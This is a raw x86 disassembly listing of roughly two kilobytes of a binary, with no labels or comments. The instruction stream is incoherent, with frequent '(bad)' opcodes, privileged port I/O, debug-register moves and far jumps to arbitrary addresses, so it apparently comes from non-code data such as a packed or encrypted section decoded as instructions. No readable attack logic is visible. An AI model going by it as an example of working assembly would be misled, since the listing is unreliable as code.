  419eeb:	fwait
  419eec:	xor    BYTE PTR [ecx-0x8a00e6f],ch
  419ef2:	sub    eax,ebp
  419ef4:	xchg   edi,eax
  419ef5:	jg     0x419eba
  419ef7:	jmp    0x419f71
  419ef9:	and    ah,BYTE PTR [esi+0x6a]
  419efc:	xor    ch,al
  419efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eff:	mov    eax,0x9c21fd6
  419f04:	add    DWORD PTR [edi+0x6e181bdf],ebp
  419f0a:	stos   BYTE PTR es:[edi],al
  419f0b:	sub    BYTE PTR [eax+0x9],0x8c
  419f0f:	push   0xffffffe5
  419f11:	push   ecx
  419f12:	xchg   esi,eax
  419f13:	sti    
  419f14:	jp     0x419f24
  419f16:	test   al,0xdf
  419f18:	icebp  
  419f19:	addr16 cmp eax,0x6d330606
  419f1f:	lds    edi,FWORD PTR [edi-0x4d]
  419f22:	in     eax,dx
  419f23:	retf   0xcc11
  419f26:	sub    DWORD PTR [ebx-0x375ab498],esp
  419f2c:	shr    ch,1
  419f2e:	(bad)  
  419f2f:	fimul  WORD PTR [ecx]
  419f31:	in     eax,0xe4
  419f33:	lea    edx,[esi]
  419f35:	in     eax,0xba
  419f37:	push   ecx
  419f38:	(bad)  
  419f39:	loopne 0x419fb9
  419f3b:	sar    esi,cl
  419f3d:	cli    
  419f3e:	jb     0x419fbe
  419f40:	leave  
  419f41:	pop    ss
  419f42:	pop    ss
  419f43:	mov    al,ds:0x5b6c0c7d
  419f48:	adc    edi,eax
  419f4a:	cmp    DWORD PTR [esi-0x188dc0ac],edi
  419f50:	push   0x51
  419f52:	in     eax,0x2f
  419f54:	clc    
  419f55:	lds    ecx,FWORD PTR [esi]
  419f57:	sub    DWORD PTR [ecx-0x2dd6a697],0x7
  419f5e:	xchg   edi,eax
  419f5f:	lods   eax,DWORD PTR ds:[esi]
  419f60:	arpl   WORD PTR [ecx-0x44562ffd],ax
  419f66:	rcl    BYTE PTR ds:[ecx],1
  419f69:	in     eax,dx
  419f6a:	icebp  
  419f6b:	sub    eax,0x943edda6
  419f70:	repnz cmp al,0x17
  419f73:	mov    ?,WORD PTR [edx+ecx*8-0x763f3b6]
  419f7a:	inc    ebp
  419f7b:	test   BYTE PTR ds:0x89c0a47d,0xc8
  419f82:	pop    ebp
  419f83:	jbe    0x419f8a
  419f85:	int3   
  419f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f87:	sbb    DWORD PTR [ecx],ecx
  419f89:	mul    DWORD PTR [eax]
  419f8b:	adc    al,BYTE PTR es:[esi-0x6c1d08bc]
  419f92:	sahf   
  419f93:	hlt    
  419f94:	loope  0x419f6c
  419f96:	jge    0x41a007
  419f98:	jno    0x419f5e
  419f9a:	(bad)  
  419f9b:	arpl   WORD PTR [edx],dx
  419f9d:	inc    edx
  419f9e:	jo     0x419fb9
  419fa0:	js     0x419f8c
  419fa2:	call   0xeb73:0x51eefdee
  419fa9:	push   ds
  419faa:	lea    ebp,[esi-0x6a]
  419fad:	jb     0x419f59
  419faf:	add    DWORD PTR [edx],ebp
  419fb1:	stos   DWORD PTR es:[edi],eax
  419fb2:	out    dx,eax
  419fb3:	jbe    0x419f67
  419fb5:	ins    DWORD PTR es:[edi],dx
  419fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fb7:	sbb    eax,0xf8b63b86
  419fbc:	fcom   DWORD PTR [ebp-0x3]
  419fbf:	mov    ecx,0x8099b83c
  419fc4:	mov    dl,0x5e
  419fc6:	inc    eax
  419fc7:	call   0x7461:0x12ef6f6e
  419fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fcf:	or     al,0xa3
  419fd1:	ins    BYTE PTR es:[edi],dx
  419fd2:	pop    edi
  419fd3:	clc    
  419fd4:	or     al,0x5c
  419fd6:	xchg   ebp,eax
  419fd7:	rol    bl,1
  419fd9:	(bad)  
  419fda:	mov    bl,0xb8
  419fdc:	mov    al,ds:0x92620b42
  419fe1:	push   ecx
  419fe2:	pushf  
  419fe3:	(bad)  [ebx+ecx*8]
  419fe6:	xchg   edi,eax
  419fe7:	into   
  419fe8:	scas   al,BYTE PTR es:[edi]
  419fe9:	pop    es
  419fea:	inc    edi
  419feb:	cld    
  419fec:	pushf  
  419fed:	sub    ebp,DWORD PTR [edi+0x72]
  419ff0:	inc    ebp
  419ff1:	int3   
  419ff2:	outs   dx,BYTE PTR ds:[esi]
  419ff3:	out    0x8d,eax
  419ff5:	lahf   
  419ff6:	xor    esi,DWORD PTR [ebp+0x76679850]
  419ffc:	mov    db0,esp
  419fff:	sub    esp,DWORD PTR [eax-0x21]
  41a002:	gs popf 
  41a004:	lods   al,BYTE PTR ds:[esi]
  41a005:	dec    ecx
  41a006:	push   cs
  41a007:	mov    esp,0x75f19c76
  41a00c:	mov    al,ds:0x1378c1d9
  41a011:	pop    edi
  41a012:	inc    esp
  41a013:	mov    bl,0xba
  41a015:	inc    eax
  41a016:	xchg   esi,eax
  41a017:	loope  0x419ff9
  41a019:	xchg   ecx,eax
  41a01a:	jbe    0x419fab
  41a01c:	loope  0x41a087
  41a01e:	jo     0x419fdf
  41a020:	outs   dx,DWORD PTR ds:[esi]
  41a021:	ins    BYTE PTR es:[edi],dx
  41a022:	call   0xe0e9:0xc5e66388
  41a029:	mov    ds:0xeea98836,eax
  41a02e:	or     DWORD PTR [eax-0x283769a2],esi
  41a034:	adc    esi,edx
  41a036:	mov    eax,0x4e1794b3
  41a03b:	ja     0x41a005
  41a03d:	push   cs
  41a03e:	ret    0x701b
  41a041:	xchg   esp,eax
  41a042:	enter  0x54fe,0x62
  41a046:	mov    al,0x9a
  41a048:	scas   eax,DWORD PTR es:[edi]
  41a049:	xor    al,BYTE PTR [eax]
  41a04b:	sbb    bh,al
  41a04d:	and    DWORD PTR [ebp+0x3625b977],esi
  41a053:	push   0x34
  41a055:	test   eax,0x30676f8
  41a05a:	mov    bh,0xab
  41a05c:	stc    
  41a05d:	pop    ebx
  41a05e:	fbld   TBYTE PTR [ebx]
  41a060:	retf   
  41a061:	sub    esp,DWORD PTR [ebp+0x28]
  41a064:	int3   
  41a065:	add    DWORD PTR [esi+0x4fd593ed],ebp
  41a06b:	jae    0x41a0d1
  41a06d:	cmp    DWORD PTR [ebp+0x15],ecx
  41a070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a071:	xor    BYTE PTR [edx+edx*1+0x7d],ah
  41a075:	sub    dl,bl
  41a077:	pop    eax
  41a078:	jo     0x41a0cd
  41a07a:	push   es
  41a07b:	cmp    BYTE PTR [eax-0x3b],cl
  41a07e:	dec    ebx
  41a07f:	(bad)  [ecx*2+0x4b43e66]
  41a086:	frstor [ebp+0xa]
  41a089:	add    BYTE PTR [ebx],ch
  41a08b:	sbb    eax,0xddfc4fa6
  41a090:	clc    
  41a091:	jge    0x41a0a4
  41a093:	cdq    
  41a094:	test   DWORD PTR [edi],ebp
  41a096:	mov    eax,es:0x1c9211df
  41a09c:	mov    edx,0x3d657038
  41a0a1:	add    edi,DWORD PTR [esi+ebx*4+0x2a]
  41a0a5:	es add eax,0x7e232946
  41a0ab:	test   eax,0x4d07904e
  41a0b0:	mov    ebx,0x1f1d0089
  41a0b5:	stos   BYTE PTR es:[edi],al
  41a0b6:	sub    ch,BYTE PTR [eax]
  41a0b8:	fdivrp st(4),st
  41a0ba:	add    BYTE PTR [esi],cl
  41a0bc:	pop    edi
  41a0bd:	adc    dh,BYTE PTR [eax-0x4b]
  41a0c0:	stc    
  41a0c1:	and    dh,cl
  41a0c3:	repz aad 0x7d
  41a0c6:	push   ebx
  41a0c7:	inc    esi
  41a0c8:	xchg   edi,eax
  41a0c9:	xchg   DWORD PTR [eax-0x704202a0],edi
  41a0cf:	lahf   
  41a0d0:	adc    eax,0x27c7a518
  41a0d5:	bound  ecx,QWORD PTR [esi]
  41a0d7:	push   esp
  41a0d8:	pop    ds
  41a0d9:	into   
  41a0da:	data16 mov al,0xca
  41a0dd:	nop
  41a0de:	push   ebx
  41a0df:	call   0x712d:0xf7252cf8
  41a0e6:	pop    ebp
  41a0e7:	push   edi
  41a0e8:	xchg   esi,eax
  41a0e9:	int    0x19
  41a0eb:	lds    ebx,FWORD PTR [ecx+0x650b3a08]
  41a0f1:	adc    al,dl
  41a0f3:	cld    
  41a0f4:	aaa    
  41a0f5:	push   ebp
  41a0f6:	mov    bh,0x2b
  41a0f8:	xor    bl,0x16
  41a0fb:	sbb    al,0x87
  41a0fd:	mov    ebx,0x202610f0
  41a102:	(bad)  
  41a103:	sub    bl,BYTE PTR [esi-0x41]
  41a106:	test   DWORD PTR [edx+0x7c6d6593],edx
  41a10c:	popf   
  41a10d:	pop    ebp
  41a10e:	das    
  41a10f:	outs   dx,BYTE PTR ds:[esi]
  41a110:	leave  
  41a111:	mov    esi,0xaaf381e0
  41a116:	mov    ebp,0xb589229d
  41a11b:	xchg   DWORD PTR [edi],esi
  41a11d:	cmp    eax,0xa7316b38
  41a122:	loope  0x41a12e
  41a124:	jecxz  0x41a168
  41a126:	out    0xe5,eax
  41a128:	mov    al,ds:0x7146abd0
  41a12d:	(bad)  [esi]
  41a12f:	push   ss
  41a130:	icebp  
  41a131:	xor    BYTE PTR [eax],0xc8
  41a134:	mov    bl,0x24
  41a136:	cli    
  41a137:	int3   
  41a138:	lods   eax,DWORD PTR ds:[esi]
  41a139:	pop    ss
  41a13a:	cmc    
  41a13b:	out    0xa5,eax
  41a13d:	mov    esi,DWORD PTR [edi+0x55]
  41a140:	stos   BYTE PTR es:[edi],al
  41a141:	sbb    edx,esi
  41a143:	jne    0x41a1b4
  41a145:	xchg   edi,eax
  41a146:	push   0xa
  41a148:	outs   dx,DWORD PTR ds:[esi]
  41a149:	jmp    0x41a0fe
  41a14b:	push   ecx
  41a14c:	sub    al,0xd7
  41a14e:	fisub  WORD PTR [edx+0x45471a8f]
  41a154:	xchg   edx,eax
  41a155:	stos   DWORD PTR es:[edi],eax
  41a156:	add    esi,DWORD PTR [ecx]
  41a158:	and    ah,0x16
  41a15b:	xchg   ebx,eax
  41a15c:	mov    dl,BYTE PTR [edi]
  41a15e:	add    eax,0xbd03e335
  41a163:	out    dx,al
  41a164:	jl     0x41a121
  41a166:	sub    eax,0xb2e3e129
  41a16b:	into   
  41a16c:	aaa    
  41a16d:	aad    0x94
  41a16f:	adc    bh,cl
  41a171:	aad    0x21
  41a173:	jnp    0x41a1b8
  41a175:	add    al,0xa3
  41a177:	sahf   
  41a178:	and    ah,bh
  41a17a:	xchg   BYTE PTR [ecx+0x32],cl
  41a17d:	cmp    dh,BYTE PTR [ebp-0x52]
  41a180:	sub    ch,BYTE PTR [edx]
  41a182:	adc    dh,BYTE PTR [ecx+0x443e6eda]
  41a188:	mov    al,ds:0xdf5cf101
  41a18d:	dec    ecx
  41a18e:	mov    DWORD PTR [ecx+0x3d725b44],ebx
  41a194:	adc    esp,edi
  41a196:	inc    ebx
  41a197:	sub    al,0xd0
  41a199:	sbb    al,BYTE PTR [edi]
  41a19b:	add    ah,dh
  41a19d:	mov    ebx,DWORD PTR [ebp-0x7c]
  41a1a0:	out    0x3a,eax
  41a1a2:	je     0x41a197
  41a1a4:	pushf  
  41a1a5:	jle    0x41a1b1
  41a1a7:	data16 shl cl,1
  41a1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ab:	mov    bh,0xa6
  41a1ad:	mov    al,ds:0xc57de2b6
  41a1b2:	test   eax,0xe6ee93a8
  41a1b7:	xchg   esp,eax
  41a1b8:	in     eax,0xa1
  41a1ba:	mov    dl,0x1e
  41a1bc:	mov    WORD PTR [edx],?
  41a1be:	add    al,0x1b
  41a1c0:	cwde   
  41a1c1:	rol    DWORD PTR [ebx-0x1b],1
  41a1c4:	add    eax,0xa5e996db
  41a1c9:	fwait
  41a1ca:	jg     0x41a23c
  41a1cc:	sbb    al,0xbb
  41a1ce:	mov    ebp,0x596acf54
  41a1d3:	adc    dh,BYTE PTR [ecx-0x7b]
  41a1d6:	inc    edx
  41a1d7:	push   edx
  41a1d8:	hlt    
  41a1d9:	fadd   QWORD PTR [esi-0x6c2f6a69]
  41a1df:	sbb    DWORD PTR [ebx],esp
  41a1e1:	cmp    DWORD PTR [ebx],edx
  41a1e3:	or     DWORD PTR [edx-0x401e0c3],0x4fa13dfc
  41a1ed:	push   esp
  41a1ee:	pop    ds
  41a1ef:	hlt    
  41a1f0:	fbld   TBYTE PTR [esi]
  41a1f2:	rcr    BYTE PTR [ebp-0x243d0a05],0xd
  41a1f9:	add    al,0xa1
  41a1fb:	xchg   edx,eax
  41a1fc:	out    0x91,eax
  41a1fe:	ins    BYTE PTR es:[edi],dx
  41a1ff:	sub    al,BYTE PTR [esi]
  41a201:	shl    BYTE PTR [edi],0x7e
  41a204:	mov    es,edx
  41a206:	out    0xd5,eax
  41a208:	cmc    
  41a209:	push   0x84518d23
  41a20e:	aaa    
  41a20f:	stc    
  41a210:	clc    
  41a211:	jle    0x41a1e6
  41a213:	mov    dh,0x34
  41a215:	xchg   ecx,eax
  41a216:	inc    ecx
  41a217:	xor    eax,0xc2568d75
  41a21c:	retf   
  41a21d:	mov    edx,0x8ee73c55
  41a222:	pop    ebx
  41a223:	daa    
  41a224:	loop   0x41a23c
  41a226:	xchg   edi,eax
  41a227:	cmp    DWORD PTR [esi-0x2ef685f7],0x4254bbbd
  41a231:	dec    eax
  41a232:	xchg   edi,eax
  41a233:	scas   eax,DWORD PTR es:[edi]
  41a234:	mov    cs,WORD PTR [edx-0x219db2d3]
  41a23a:	mov    WORD PTR [eax+0x50],fs
  41a23d:	das    
  41a23e:	fistp  DWORD PTR [ecx-0x6a66a3f7]
  41a244:	les    ebp,FWORD PTR [esi*2-0x25a687f]
  41a24b:	enter  0x3c1,0x95
  41a24f:	xor    eax,0x70041354
  41a254:	ret    
  41a255:	jmp    0xd5e8:0xd87698aa
  41a25c:	cmp    eax,DWORD PTR [edi*8-0x4951e0b8]
  41a263:	mov    ebp,0xaed6122a
  41a268:	push   es
  41a269:	inc    BYTE PTR [edi-0x39]
  41a26c:	je     0x41a26f
  41a26e:	in     al,dx
  41a26f:	sbb    al,0xf1
  41a271:	arpl   WORD PTR [esp+edi*8+0x1f],di
  41a275:	push   ss
  41a276:	jge    0x41a1f8
  41a278:	xor    al,BYTE PTR [edx]
  41a27a:	cli    
  41a27b:	les    ecx,FWORD PTR [edx+ebx*4-0x53]
  41a27f:	xchg   ebp,eax
  41a280:	push   esi
  41a281:	dec    esi
  41a282:	pop    esp
  41a283:	loope  0x41a22b
  41a285:	mov    bl,0x94
  41a287:	out    dx,al
  41a288:	pop    esp
  41a289:	inc    eax
  41a28a:	cmp    BYTE PTR [ebx],ch
  41a28c:	push   0xffffffe5
  41a28e:	mov    dh,0x96
  41a290:	xchg   esi,eax
  41a291:	pop    ebx
  41a292:	clc    
  41a293:	jns    0x41a2d0
  41a295:	rcl    BYTE PTR [ebp+0x73],0x1b
  41a299:	repz jae 0x41a2af
  41a29c:	out    0xdf,eax
  41a29e:	jp     0x41a30e
  41a2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a1:	adc    DWORD PTR [ecx+0x63315fb6],eax
  41a2a7:	cdq    
  41a2a8:	out    dx,al
  41a2a9:	test   ebp,edx
  41a2ab:	outs   dx,DWORD PTR ds:[esi]
  41a2ac:	jb     0x41a25e
  41a2ae:	iret   
  41a2af:	pop    esp
  41a2b0:	mov    ?,WORD PTR [ecx-0x50]
  41a2b3:	lds    ebp,FWORD PTR ds:0x6548c4d0
  41a2b9:	pushf  
  41a2ba:	out    0x10,eax
  41a2bc:	mov    bl,0x3b
  41a2be:	adc    BYTE PTR [ebx+0x367c0acf],ah
  41a2c4:	gs push ebx
  41a2c6:	cmp    BYTE PTR [eax],ch
  41a2c8:	adc    BYTE PTR [edx+0x43],0x40
  41a2cc:	xchg   DWORD PTR [ebp+eiz*1+0x58],eax
  41a2d0:	nop
  41a2d1:	pop    ebp
  41a2d2:	cli    
  41a2d3:	fs in  eax,dx
  41a2d5:	stos   BYTE PTR es:[edi],al
  41a2d6:	shl    DWORD PTR [eax+0x4c7c444e],cl
  41a2dc:	int3   
  41a2dd:	bound  esi,QWORD PTR [edi-0x2b]
  41a2e0:	jne    0x41a29e
  41a2e2:	retf   
  41a2e3:	xchg   ebx,eax
  41a2e4:	loop   0x41a2aa
  41a2e6:	jmp    0x31ab:0xabc8db4d
  41a2ed:	push   esp
  41a2ee:	inc    ebp
  41a2ef:	push   0xffffffde
  41a2f1:	retf   
  41a2f2:	jnp    0x41a284
  41a2f4:	fistp  WORD PTR [ecx+esi*1+0x6]
  41a2f8:	popf   
  41a2f9:	std    
  41a2fa:	leave  
  41a2fb:	cmp    DWORD PTR [eax+ebx*2],edi
  41a2fe:	cmp    ebp,DWORD PTR [edx+0xd]
  41a301:	adc    eax,0x32b8dee9
  41a306:	sbb    ebp,ebp
  41a308:	ror    DWORD PTR [ecx+0x56aa195],cl
  41a30e:	mov    bl,0xee
  41a310:	sbb    eax,0xa3e47391
  41a315:	xor    al,0xd9
  41a317:	and    al,0xb1
  41a319:	(bad)
  41a31c:	mov    eax,ds:0xf1d2b2ca
  41a321:	mov    esi,0xdecc8f1c
  41a326:	in     eax,dx
  41a327:	clc    
  41a328:	jle    0x41a300
  41a32a:	fstp   QWORD PTR ds:0xdfe6a23
  41a330:	cmp    cl,dh
  41a332:	fstp   QWORD PTR [edi-0x1f38e6f]
  41a338:	push   eax
  41a339:	je     0x41a3b6
  41a33b:	xor    dl,BYTE PTR [eax+0xc330a11]
  41a341:	xchg   ebp,eax
  41a342:	cmp    eax,0x339438ec
  41a347:	test   eax,0xa303b64b
  41a34c:	dec    eax
  41a34d:	pusha  
  41a34e:	and    dl,ah
  41a350:	xchg   edx,eax
  41a351:	mov    dl,0x9c
  41a353:	jmp    0x54160152
  41a358:	rcr    BYTE PTR [ecx+0x48],cl
  41a35b:	or     dh,BYTE PTR [ebp-0x30]
  41a35e:	dec    ebx
  41a35f:	aam    0x43
  41a361:	nop
  41a362:	mov    esi,0xd87ed3f8
  41a367:	int    0x94
  41a369:	js     0x41a3c6
  41a36b:	xor    al,0xfc
  41a36d:	repz push edx
  41a36f:	sahf   
  41a370:	aaa    
  41a371:	and    BYTE PTR [eax+0x2e7bb2ad],ah
  41a377:	ins    BYTE PTR es:[edi],dx
  41a378:	xchg   ebx,eax
  41a379:	mov    ebp,0x61de2069
  41a37e:	dec    edi
  41a37f:	pushf  
  41a380:	cmp    ch,cl
  41a382:	mov    dl,0x24
  41a384:	or     al,dh
  41a386:	pop    ecx
  41a387:	adc    DWORD PTR [eax+0x55],edi
  41a38a:	daa    
  41a38b:	out    dx,eax
  41a38c:	aas    
  41a38d:	pusha  
  41a38e:	inc    ebx
  41a38f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a391:	fwait
  41a392:	outs   dx,DWORD PTR ds:[esi]
  41a393:	int3   
  41a394:	mov    ch,0xd1
  41a396:	pop    esi
  41a397:	push   ds
  41a398:	pop    ss
  41a399:	neg    ebp
  41a39b:	ret    
  41a39c:	rcl    esp,cl
  41a39e:	dec    ebx
  41a39f:	data16 xor al,0xfe
  41a3a2:	pop    edi
  41a3a3:	pop    eax
  41a3a4:	inc    ah
  41a3a6:	scas   eax,DWORD PTR es:[edi]
  41a3a7:	mov    WORD PTR [edx+0x7cfaeb89],ss
  41a3ad:	call   0x5f896ae2
  41a3b2:	lahf   
  41a3b3:	daa    
  41a3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3b5:	fcmovb st,st(0)
  41a3b7:	mov    edi,0x5ce8fbf
  41a3bc:	enter  0xb7d1,0xfd
  41a3c0:	mov    eax,ds:0x721e1483
  41a3c5:	mov    dh,0x10
  41a3c7:	daa    
  41a3c8:	inc    edx
  41a3c9:	test   cl,bh
  41a3cb:	or     al,0x1e
  41a3cd:	daa    
  41a3ce:	stos   BYTE PTR es:[edi],al
  41a3cf:	(bad)  
  41a3d0:	sbb    BYTE PTR [eax],dl
  41a3d2:	shl    cl,0x45
  41a3d5:	or     DWORD PTR [eax-0x7afb9e2],esi
  41a3db:	iret   
  41a3dc:	and    al,0x1e
  41a3de:	sub    bh,BYTE PTR [ebx+0x421b1d49]
  41a3e4:	in     al,0x57
  41a3e6:	imul   ebp,esp,0xdd52cc38
  41a3ec:	cmc    
  41a3ed:	adc    al,0xe8
  41a3ef:	push   esp
  41a3f0:	and    ebx,DWORD PTR [esi+0x79]
  41a3f3:	lods   eax,DWORD PTR ds:[esi]
  41a3f4:	daa    
  41a3f5:	or     ah,BYTE PTR [eax]
  41a3f7:	sar    BYTE PTR [edi+0xf],1
  41a3fa:	lahf   
  41a3fb:	pop    ebp
  41a3fc:	cmc    
  41a3fd:	adc    dh,al
  41a3ff:	xchg   ecx,eax
  41a400:	cmp    eax,0x9f97171a
  41a405:	pop    ebp
  41a406:	jmp    0x844160a
  41a40b:	and    eax,0x48bbe437
  41a410:	and    al,0xaa
  41a412:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a414:	adc    eax,0x8a8b03d9
  41a419:	xchg   edx,esp
  41a41b:	sbb    bl,BYTE PTR [ebx-0x5f]
  41a41e:	addr16 cmp al,0x3d
  41a421:	mov    dh,0x25
  41a423:	mov    BYTE PTR [edx+ecx*4-0x4c],0x6a
  41a428:	gs icebp 
  41a42a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41a42c:	xchg   ebx,eax
  41a42d:	xor    esi,ebx
  41a42f:	fs inc eax
  41a431:	xchg   esi,eax
  41a432:	dec    esi
  41a433:	inc    eax
  41a434:	call   0xf12f6415
  41a439:	mov    eax,ds:0xa41b173d
  41a43e:	dec    esi
  41a43f:	add    bh,0x36
  41a442:	es cmp eax,0xce804b84
  41a448:	lea    ecx,[esi-0x6d]
  41a44b:	pusha  
  41a44c:	jo     0x41a3d8
  41a44e:	dec    esp
  41a44f:	cmp    dl,BYTE PTR [eax+0x22]
  41a452:	mov    bl,0x40
  41a454:	lock out 0x0,eax
  41a457:	cmp    bl,BYTE PTR [eax]
  41a459:	mov    al,ds:0xa3affb0a
  41a45e:	leave  
  41a45f:	lea    ebx,[edx+0x3dc4e982]
  41a465:	inc    esp
  41a466:	sub    DWORD PTR cs:[eax+0x3b],0xaf6a1456
  41a46e:	cmp    ebp,DWORD PTR [esi+0x6b]
  41a471:	rcl    DWORD PTR [esi+0x31],1
  41a474:	(bad)  
  41a475:	jb     0x41a433
  41a477:	ins    BYTE PTR es:[edi],dx
  41a478:	adc    al,0xa0
  41a47a:	lods   eax,DWORD PTR ds:[esi]
  41a47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a47c:	shr    BYTE PTR gs:[esi],cl
  41a47f:	cdq    
  41a480:	sub    dl,BYTE PTR [ebx+0x54]
  41a483:	cmp    BYTE PTR ds:0x3a593524,ch
  41a489:	pop    es
  41a48a:	jo     0x41a44d
  41a48c:	iret   
  41a48d:	ret    0x8ddf
  41a490:	in     eax,dx
  41a491:	push   ebp
  41a492:	mov    bl,0x4a
  41a494:	push   ebp
  41a495:	pop    eax
  41a496:	fcmovnb st,st(4)
  41a498:	and    BYTE PTR [ecx+0x43],dh
  41a49b:	mov    bh,0x5e
  41a49d:	fcmovu st,st(7)
  41a49f:	push   ebx
  41a4a0:	and    al,0x80
  41a4a2:	mov    WORD PTR [ebp-0x5f4a78d0],ss
  41a4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4a9:	push   0x7f14277c
  41a4ae:	std    
  41a4af:	xor    al,cl
  41a4b1:	push   ds
  41a4b2:	js     0x41a500
  41a4b4:	hlt    
  41a4b5:	and    bl,0x7c
  41a4b8:	call   0xdcdc332f
  41a4bd:	jle    0x41a537
  41a4bf:	aad    0x26
  41a4c1:	inc    ecx
  41a4c2:	aam    0xb
  41a4c4:	or     BYTE PTR [ebp-0x35],bl
  41a4c7:	sub    BYTE PTR [ecx],al
  41a4c9:	loopne 0x41a4f7
  41a4cb:	fld    TBYTE PTR [ecx+0x64]
  41a4ce:	pushf  
  41a4cf:	pop    edi
  41a4d0:	sbb    eax,0x2f7a8e9e
  41a4d5:	lds    ecx,FWORD PTR [esi+esi*1-0x13]
  41a4d9:	cmc    
  41a4da:	int3   
  41a4db:	push   ebx
  41a4dc:	mov    ds:0x336cbade,eax
  41a4e1:	lahf   
  41a4e2:	adc    dl,BYTE PTR [esp+ecx*2+0x28c64cd3]
  41a4e9:	out    dx,eax
  41a4ea:	xchg   BYTE PTR [edi-0x793b8087],al
  41a4f0:	pop    ds
  41a4f1:	inc    ecx
  41a4f2:	fldenv [eax+0x48d2b776]
  41a4f8:	cmp    al,0x1
  41a4fa:	xchg   ebp,eax
  41a4fb:	shl    esi,1
  41a4fd:	lock in eax,dx
  41a4ff:	inc    esp
  41a500:	gs jge 0x41a4b3
  41a503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a504:	jmp    0xb9d57234
  41a509:	mov    eax,0x65bf9399
  41a50e:	cwde   
  41a50f:	popa   
  41a510:	push   edx
  41a511:	cld    
  41a512:	movsx  ecx,WORD PTR [edx]
  41a515:	jb     0x41a545
  41a517:	jmp    0x2379fa56
  41a51c:	sub    bh,BYTE PTR [esi-0x7]
  41a51f:	pop    es
  41a520:	cmp    cl,bh
  41a522:	daa    
  41a523:	cmp    ebx,0xfffffff2
  41a526:	outs   dx,BYTE PTR ds:[esi]
  41a527:	(bad)  
  41a528:	xchg   edi,eax
  41a529:	xor    edi,0x4fa383ba
  41a52f:	pop    edi
  41a530:	push   es
  41a531:	outs   dx,DWORD PTR ds:[esi]
  41a532:	pop    eax
  41a533:	add    dh,BYTE PTR [eax]
  41a535:	mov    BYTE PTR [ecx],bl
  41a537:	push   esi
  41a538:	adc    al,0x65
  41a53a:	pushf  
  41a53b:	dec    ebx
  41a53c:	pop    edx
  41a53d:	inc    ebx
  41a53e:	(bad)  
  41a53f:	das    
  41a540:	jmp    0x41a548
  41a542:	stos   DWORD PTR es:[edi],eax
  41a543:	fidivr DWORD PTR [edx-0x1fa7dfaa]
  41a549:	pop    ebp
  41a54a:	call   0x26c9959
  41a54f:	mov    ds:0x2a602f0c,al
  41a554:	sub    BYTE PTR [ebx+0x1f],0xb0
  41a558:	or     al,0x5
  41a55a:	scas   al,BYTE PTR es:[edi]
  41a55b:	rcr    BYTE PTR es:[esi-0x17],0x49
  41a560:	ror    BYTE PTR [ebx+eiz*2-0x61],1
  41a564:	sbb    esi,DWORD PTR [edx-0x4b]
  41a567:	lds    esp,FWORD PTR [esi+0x7c]
  41a56a:	jp     0x41a567
  41a56c:	adc    eax,0xda0cf4fc
  41a571:	ss pop ss
  41a573:	pop    edx
  41a574:	jp     0x41a531
  41a576:	push   0xc9ecd754
  41a57b:	call   0x3b53:0x461cfd9
  41a582:	aam    0xf4
  41a584:	scas   eax,DWORD PTR es:[edi]
  41a585:	xchg   esi,eax
  41a586:	pop    ds
  41a587:	jno    0x41a5f0
  41a589:	or     DWORD PTR [ebp+0x1c],ecx
  41a58c:	push   ss
  41a58d:	out    dx,eax
  41a58e:	fmul   DWORD PTR [edi]
  41a590:	pop    ebx
  41a591:	xchg   BYTE PTR [esi+0xcff1104],ah
  41a597:	loope  0x41a5b8
  41a599:	shl    eax,1
  41a59b:	pop    eax
  41a59c:	or     BYTE PTR [eax],ah
  41a59e:	loopne 0x41a569
  41a5a0:	mov    al,ds:0xb7d1a199
  41a5a5:	adc    al,0xa1
  41a5a7:	mov    esi,0xfed03cf5
  41a5ac:	adc    DWORD PTR [ebp-0x5d],0xffffffde
  41a5b0:	push   ebp
  41a5b1:	jo     0x41a56c
  41a5b3:	adc    DWORD PTR [eax+0x37],esi
  41a5b6:	es pop es
  41a5b8:	int3   
  41a5b9:	cmp    eax,0x1e34cccb
  41a5bf:	pushf  
  41a5c0:	ficomp DWORD PTR [edi]
  41a5c2:	pop    ds
  41a5c3:	sahf   
  41a5c4:	cmp    eax,0xb3ebd0b7
  41a5c9:	iret   
  41a5ca:	adc    al,0x2c
  41a5cc:	les    eax,FWORD PTR [edx+0x3e]
  41a5cf:	or     eax,0x94708a86
  41a5d4:	adc    eax,0x420a3eb3
  41a5d9:	push   0xffffffab
  41a5db:	push   0x9ba0c763
  41a5e0:	fdivr  st,st(5)
  41a5e2:	pop    eax
  41a5e3:	pop    ebx
  41a5e4:	imul   ebx,DWORD PTR [ebx-0x1ec3d455],0xfffffffd
  41a5eb:	and    eax,DWORD PTR [esp+ebp*4-0x79]
  41a5ef:	arpl   WORD PTR [ecx+0xb],si
  41a5f2:	sbb    DWORD PTR [edx+0x35],edx
  41a5f5:	or     al,0xe3
  41a5f7:	scas   eax,DWORD PTR es:[edi]
  41a5f8:	sub    DWORD PTR [edx+eax*8-0x12],esp
  41a5fc:	mov    al,ds:0xca6c39f4
  41a601:	lea    edx,[edi]
  41a603:	jne    0x41a592
  41a605:	add    ecx,esi
  41a607:	bound  ebp,QWORD PTR [ebx-0x6e]
  41a60a:	xchg   ebx,eax
  41a60b:	inc    edx
  41a60c:	adc    bh,ch
  41a60e:	or     eax,0xbc12f0b6
  41a613:	push   ecx
  41a614:	mov    BYTE PTR [edi],0x83
  41a617:	std    
  41a618:	retf   0x7e55
  41a61b:	scas   eax,DWORD PTR es:[edi]
  41a61c:	jle    0x41a656
  41a61e:	in     al,dx
  41a61f:	ss scas al,BYTE PTR es:[edi]
  41a621:	inc    edi
  41a622:	je     0x41a5a4
  41a624:	ficomp WORD PTR [ebp-0x7c]
  41a627:	jp     0x41a5f2
